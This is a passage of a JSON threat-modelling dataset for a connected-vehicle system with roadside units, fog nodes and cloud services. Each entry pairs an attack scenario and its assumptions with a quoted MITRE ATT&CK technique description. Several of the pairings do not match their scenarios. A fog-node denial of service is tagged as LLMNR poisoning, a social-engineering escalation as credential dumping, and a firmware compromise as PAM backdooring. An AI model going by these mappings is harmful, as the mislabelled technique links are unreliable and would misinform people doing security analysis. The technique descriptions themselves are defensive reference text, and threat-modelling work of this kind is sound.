                    "Condition": "Valid if insider access is not properly managed."
                },
                {
                    "Assumption": "Collected data is valuable to competitors.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if data has high competitive value."
                },
                {
                    "Assumption": "There are no logging or monitoring of sensitive data access.",
                    "Role": "System Administrator",
                    "Condition": "Valid if data access is not logged."
                }
            ],
            "Potential Impact": "Competitive advantage loss and potential financial impacts.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data leakage",
                "competitors",
                "unauthorized access",
                "confidentiality"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on roadside units, disrupting traffic management.",
            "Assumptions": [
                {
                    "Assumption": "RSUs are not protected against high-volume traffic.",
                    "Role": "System Architect",
                    "Condition": "Valid if RSUs lack traffic management."
                },
                {
                    "Assumption": "The attacker has access to a botnet to generate high-volume traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if botnet access is available."
                },
                {
                    "Assumption": "Traffic management relies on continuous RSU operation.",
                    "Role": "RSU",
                    "Condition": "Valid if RSUs are critical for real-time decisions."
                }
            ],
            "Potential Impact": "Disruption of traffic flow and potential vehicular accidents.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "traffic disruption",
                "availability",
                "network",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A targeted DoS attack on fog nodes causes them to crash, interrupting local processing.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are not resilient to DoS attacks.",
                    "Role": "System Administrator",
                    "Condition": "Valid if resilience is low."
                },
                {
                    "Assumption": "The attacker can direct traffic specifically to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can target fog nodes."
                },
                {
                    "Assumption": "Critical data processing is dependent on fog nodes.",
                    "Role": "Fog Node",
                    "Condition": "Valid if fog nodes handle essential tasks."
                }
            ],
            "Potential Impact": "Loss of local processing capabilities and increased latency.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "local processing",
                "availability",
                "network",
                "service interruption"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts communication channels between fog nodes and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels lack redundancy.",
                    "Role": "System Architect",
                    "Condition": "Valid if redundancy is not in place."
                },
                {
                    "Assumption": "The attacker can intercept or block communication paths.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker controls significant network paths."
                },
                {
                    "Assumption": "Critical services rely on continuous communication between layers.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if ongoing communication is essential."
                }
            ],
            "Potential Impact": "Increased latency and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "communication disruption",
                "network",
                "availability",
                "cloud services",
                "service interruption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a vulnerability in a fog node to gain higher-level access and control.",
            "Assumptions": [
                {
                    "Assumption": "There are known vulnerabilities in fog node software.",
                    "Role": "System Administrator",
                    "Condition": "Valid if vulnerabilities exist."
                },
                {
                    "Assumption": "The attacker has discovered and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit mechanisms are known."
                },
                {
                    "Assumption": "Fog nodes run with elevated privileges during normal operation.",
                    "Role": "Fog Node",
                    "Condition": "Valid if nodes have high privileges."
                }
            ],
            "Potential Impact": "Unauthorized access and control over fog node operations.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "device",
                "control",
                "access"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker compromises RSU firmware to execute arbitrary code with high privileges.",
            "Assumptions": [
                {
                    "Assumption": "RSUs have outdated or vulnerable firmware.",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware updates are neglected."
                },
                {
                    "Assumption": "The attacker has the tools to exploit firmware vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit tools are known and accessible."
                },
                {
                    "Assumption": "RSUs operate with privileged access within the system.",
                    "Role": "RSU",
                    "Condition": "Valid if RSUs have system-wide access."
                }
            ],
            "Potential Impact": "Execution of arbitrary code leading to unauthorized actions and data access.",
            "MITRE ATT&CK Keywords": [
                "firmware attack",
                "code execution",
                "privilege escalation",
                "device",
                "access"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with basic access uses social engineering to gain administrator-level access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "There are weak insider access controls and monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access controls are not stringent."
                },
                {
                    "Assumption": "Administrators are susceptible to social engineering techniques.",
                    "Role": "Administrator",
                    "Condition": "Valid if security awareness is low."
                },
                {
                    "Assumption": "Critical tasks and data within cloud services require administrator-level access.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if admin access is necessary for critical tasks."
                }
            ],
            "Potential Impact": "Extended system control and unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "privilege escalation",
                "cloud services",
                "insider threat",
                "access"
            ],
            "mitre_technique": {
                "name": "OS Credential Dumping",
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n",
                "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
                "technique_id": "T1003"
            }
        }
    ]
}
]